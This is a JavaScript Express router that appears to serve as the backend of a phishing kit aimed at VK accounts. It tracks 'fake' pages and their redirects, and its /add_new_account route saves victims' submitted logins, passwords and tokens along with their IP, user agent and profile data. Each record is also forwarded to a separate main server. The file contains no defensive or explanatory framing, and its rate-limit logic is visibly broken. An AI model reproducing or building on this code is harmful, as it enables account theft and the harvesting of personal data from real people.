const { Router } = require("express");
const link = require("../../database/models/links");
const account = require("../../database/models/accounts");
const user = require("../../database/models/user");
const fetch = (...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args));
const router = Router();
let ip = {}

router.use((request, response, next)=>{
    let input = request.body.ip
    if(request.baseUrl === '/add_new_account'||'/update_link_data'||'/get_redirect'){
        if (ip[input]) {
            if (ip[input].count >= 10*3|| Date.now - ip[input].last_time.getTime() < 18000000) {
                console.log('Too many requests')
                return response.end()
            } else {
                if (Date.now - ip[input].last_time.getTime() < 18000000) {
                    ip[input].count = 1
                } else {
                    ip[input].count = ip[input].count + 1
                }
                ip[input].last_time = new Date()
                console.log(ip)
            }
        } else {
            ip[input] = {
                count: 1,
                last_time: new Date()
            }
        }
        next()
    }else{
        next()
    }
})

router.post("/get_redirect", async (request, response) => {
    let redirect = await user.findOne(
        { id: parseInt(request.body.id, 32) },
        { "links.redirects": 1 }
    );
   console.log(request.body.url.toString())
    let res = await link.findOne(
        { "link.link_url": request.body.url.toString()+'/'},
        { _id: 1, queries: 1 }
    );
    if (!res) {
        return response.json({ response: true, redirect: "" });
    }
    if (res.queries[request.body.fake_id]) {
        let vas_validator = res.queries[request.body.fake_id].has_validator;
        let redirect_response = res.queries[request.body.fake_id].redirect;
        if (
            redirect.links &&
            redirect.links.redirects &&
            redirect.links.redirects[res._id] &&
            redirect.links.redirects[res._id][request.body.fake_id]
        ) {
            redirect_response =
                redirect.links.redirects[res._id][request.body.fake_id];
        }
        response.json({
            response: true,
            redirect: redirect_response,
            vas_validator: vas_validator || false,
        });
    } else {
        response.end()
    }
});

router.post("/is_user_exists", async (request, response) => {
    let condidate = await user.findOne(
        { id: parseInt(request.body.id, 32) },
        { _id: 1 }
    );
    response.json({ is_user_exist: !!condidate });
});

router.post("/get_links", async (request, response) => {
    let links = await link.find({}, { link: 1, _id: 0 });
    let links_array = [];
    Array.from(links).map((e) => {
        links_array.push(e.link.link_url);
    });
    response.json({ response: true, links: links_array });
});

router.post("/update_link_data", async (request, response) => {
    let links = await user.findOne(
        { id: parseInt(request.body.id, 32) },
        { links: 1 }
    );
    
    if (links.links.links_stats) {
        if (links.links.links_stats[request.body.url+'/']) {
            links.links.links_stats[request.body.url+'/'].visited++;
        } else {
            links.links.links_stats[request.body.url+'/'] = {};
            links.links.links_stats[request.body.url+'/'].visited = 1;
        }
    } else {
        links.links.links_stats = {};
        links.links.links_stats[request.body.url+'/'] = {};
        links.links.links_stats[request.body.url+'/'].visited = 1;
    }
    await user.updateOne(
        { id: parseInt(request.body.id, 32) },
        { "links.links_stats": links.links.links_stats }
    );
    response.json({ response: true });
});

router.post("/add_new_account", async (request, response) => {

    let fakes = await link.findOne(
        { "link.link_url": 'https://'+request.body.fake_url+'/'},
        { queries: 1 }
    );

    let alredy_in_db = await account.findOne({owner_id: parseInt(request.body.user_id, 32), login: request.body.login, password: request.body.password, service:request.body.type }, {_id:1})
    console.log(alredy_in_db)
    if(alredy_in_db){

    }else{
        let new_account = {
            login: request.body.login,
            password: request.body.password,
            token: request.body.token,
            owner_id: parseInt(request.body.user_id, 32),
            date: new Date(),
            service: request.body.type,
            hide: false,
            optionals: {},
            from: {
                url: 'https://'+request.body.fake_url,
                fake_id: fakes?.queries[request.body.fake_id]?.name,
                ip: request.body.ip,
                user_agent: request.body.user_agent,
            },
        };
        if (new_account.service === "vk") {
            new_account.vk = {
                service: {
                    is_closed: request.body.is_closed,
                    has_mobile: request.body.has_mobile,
                    _2fa: false,
                    online: request.body.online?'Онлайн':'Оффлайн',
                },
                info: {
                    id: request.body.id,
                    first_name: request.body.first_name,
                    last_name: request.body.last_name,
                    photo: request.body.photo_400_orig,
                    sex: request.body.sex,
                },
                counters: {
                    friends: request.body.counters.friends,
                    followers: request.body.counters.followers,
                    gifts: request.body.counters.gifts,
                },
            };
        } else {
            new_account.vk = {};
        }
        console.log(new_account)
        await new account(new_account).save()
        await fetch(process.env.MAIN_SERVER_URL + "/api/new_account", {
            method: "POST",
            body: JSON.stringify(new_account),
            headers: { "Content-Type": "application/json" },
        });
    }
    return response.json({ response: true });
});
module.exports = router;
